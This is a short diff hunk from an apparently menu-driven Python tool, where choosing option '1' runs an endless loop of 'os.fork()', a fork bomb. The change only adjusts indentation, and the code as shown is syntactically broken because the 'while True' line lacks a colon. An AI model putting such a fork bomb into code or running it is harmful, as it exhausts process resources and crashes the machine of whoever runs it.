@@ -38,5 +38,5 @@ while True:
 	choice = input(f'\n\n\n{R}   >>>{C} ')
 	
 	if choice == '1':
-           while True
-           os.fork()
+            while True
+            os.fork()
